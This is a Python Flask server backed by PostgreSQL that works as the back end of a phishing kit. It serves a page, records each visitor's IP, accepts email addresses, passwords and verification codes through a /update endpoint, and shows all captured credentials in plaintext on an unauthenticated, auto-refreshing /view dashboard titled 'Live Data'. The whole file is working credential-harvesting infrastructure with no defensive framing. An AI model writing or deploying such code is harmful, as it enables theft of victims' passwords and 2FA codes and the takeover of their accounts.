from flask import Flask, request, send_file
import os, psycopg2

app = Flask(__name__)
DATABASE_URL = os.environ.get('DATABASE_URL')

def get_db():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    con = get_db()
    cur = con.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS sessions (
        id SERIAL PRIMARY KEY,
        sid TEXT UNIQUE,
        email TEXT DEFAULT '',
        password TEXT DEFAULT '',
        code TEXT DEFAULT '',
        time TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
    # Add new columns if they don't exist
    cur.execute("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS ip TEXT DEFAULT ''")
    cur.execute("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS visited_at TIMESTAMP DEFAULT NOW()")
    cur.execute("ALTER TABLE sessions ADD COLUMN IF NOT EXISTS updated_at TIMESTAMP DEFAULT NOW()")
    con.commit()
    cur.close()
    con.close()

@app.route("/")
def home():
    try:
        import time as t
        sid = 'visit_' + str(t.time())
        ip = request.headers.get('X-Forwarded-For', request.remote_addr or '').split(',')[0].strip()
        con = get_db()
        cur = con.cursor()
        cur.execute("INSERT INTO sessions (sid, ip) VALUES (%s, %s)", (sid, ip))
        con.commit()
        cur.close()
        con.close()
    except:
        pass
    return send_file("index.html")

@app.route("/update", methods=["POST"])
def update():
    try:
        sid = request.form.get("sid", "")
        email = request.form.get("email", "")
        password = request.form.get("password", "")
        code = request.form.get("code", "")
        ip = request.headers.get('X-Forwarded-For', request.remote_addr or '').split(',')[0].strip()
        con = get_db()
        cur = con.cursor()
        cur.execute("SELECT id FROM sessions WHERE sid=%s", (sid,))
        existing = cur.fetchone()
        if existing:
            cur.execute("""UPDATE sessions SET
                email=CASE WHEN %s != '' THEN %s ELSE email END,
                password=CASE WHEN %s != '' THEN %s ELSE password END,
                code=CASE WHEN %s != '' THEN %s ELSE code END,
                ip=%s, updated_at=NOW()
                WHERE sid=%s""",
                (email,email,password,password,code,code,ip,sid))
        else:
            cur.execute(
                "INSERT INTO sessions (sid,email,password,code,ip) VALUES (%s,%s,%s,%s,%s)",
                (sid,email,password,code,ip))
        con.commit()
        cur.close()
        con.close()
    except:
        pass
    return "OK"

@app.route("/view")
def view():
    try:
        con = get_db()
        cur = con.cursor()
        cur.execute("SELECT id,email,password,code,ip,time FROM sessions ORDER BY id DESC")
        rows = cur.fetchall()
        cur.close()
        con.close()
    except Exception as e:
        return f"<h2 style='color:red'>Error: {e}</h2>"

    rows_html = ""
    for r in rows:
        status = "✅ Submitted" if r[1] else "👁️ Visited only"
        rows_html += f"""<tr>
            <td>{r[0]}</td>
            <td>{status}</td>
            <td>{r[1] or '-'}</td>
            <td>{r[2] or '-'}</td>
            <td>{r[3] or '-'}</td>
            <td>{r[4] or '-'}</td>
            <td>{r[5]}</td>
        </tr>"""

    empty = '<tr><td colspan="7" style="text-align:center;padding:40px;color:#aaa">No visitors yet</td></tr>'

    return f"""<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Live Data</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:Arial,sans-serif;background:#fff;padding:20px}}
h1{{font-size:22px;font-weight:700;margin-bottom:12px}}
.total{{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;display:inline-block;padding:4px 12px;font-size:13px;font-weight:600;margin-bottom:16px;margin-right:8px}}
.submitted{{background:#d1e7dd;border:1px solid #0f5132;color:#0f5132}}
.wrap{{overflow-x:auto;border:1px solid #dee2e6;border-radius:4px}}
table{{width:100%;border-collapse:collapse;min-width:750px;font-size:14px}}
thead{{background:#f8f9fa}}
th{{padding:12px 10px;text-align:left;font-weight:600;border-bottom:2px solid #dee2e6;white-space:nowrap}}
td{{padding:10px;border-bottom:1px solid #dee2e6;word-break:break-all}}
tr:last-child td{{border-bottom:none}}
tr:hover td{{background:#f8f9fa}}
td:nth-child(3){{color:#0d6efd;font-weight:500}}
td:nth-child(4){{font-family:monospace;color:#198754}}
.note{{font-size:12px;color:#aaa;margin-top:10px}}
</style>
</head><body>
<h1>Live Data</h1>
<span class="total">Total visitors: {len(rows)}</span>
<span class="total submitted">Submitted: {sum(1 for r in rows if r[1])}</span>
<div class="wrap"><table>
<thead><tr><th>#</th><th>Status</th><th>Email</th><th>Password</th><th>Code</th><th>IP</th><th>Time</th></tr></thead>
<tbody>{rows_html if rows else empty}</tbody>
</table></div>
<p class="note">Auto-refreshes every 10 seconds</p>
<script>setTimeout(()=>location.reload(),10000)</script>
</body></html>"""

init_db()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9090)
